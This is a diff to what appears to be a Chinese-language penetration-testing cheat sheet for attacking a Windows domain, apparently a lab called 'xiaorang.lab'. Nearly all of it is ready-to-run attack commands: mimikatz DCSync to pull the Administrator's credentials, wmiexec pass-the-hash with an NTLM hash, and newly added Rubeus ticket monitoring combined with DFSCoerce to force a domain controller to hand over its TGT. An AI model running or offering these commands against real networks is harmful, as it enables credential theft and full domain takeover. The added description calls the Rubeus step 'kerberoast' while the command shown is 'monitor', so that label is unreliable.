@@ -209,7 +209,17 @@ mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /user:Administrator" exit
 ```
 python wmiexec.py -hashes 00000000000000000000000000000000:1a19251fbd935969832616366ae3fe62 Administrator@172.22.2.3
 ```
+## Tool
+### Rubeus
+Rubeus是用于测试Kerberos的利用工具。
 
+Rubeus kerberoast 查看哪些域用户注册了SPN，也为后续Kerberoasting做准备：
+
+```sh
+.\Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$
+# 配合使用DFSCoerce强制触发回连到win19并且获取到DC01的TGT
+python3 dfscoerce.py -u 'win19$' -hashes :917234367460f3f2817aa4439f97e636 -d xiaorang.lab win19 172.22.4.7
+```
 
 ## net use 映射磁盘
 
